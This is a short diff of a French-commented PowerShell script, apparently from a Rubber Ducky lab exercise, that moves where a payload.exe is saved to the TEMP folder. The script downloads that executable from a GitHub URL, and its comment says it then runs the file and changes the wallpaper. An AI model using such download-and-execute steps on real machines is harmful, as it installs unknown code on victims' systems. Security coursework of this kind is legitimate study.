@@ -2,7 +2,7 @@
 # Télécharge et exécute le payload, puis change le fond d'écran
 
 # Téléchargement du payload .exe
-$payloadPath = "C:\Users\Public\payload.exe"
+$payloadPath = "$env:TEMP\payload.exe"
 Write-Host "Téléchargement du payload..." -ForegroundColor Yellow
 Invoke-WebRequest -Uri 'https://github.com/L4Curtis/rubberduckyTP/raw/main/payload.exe' -OutFile $payloadPath
 
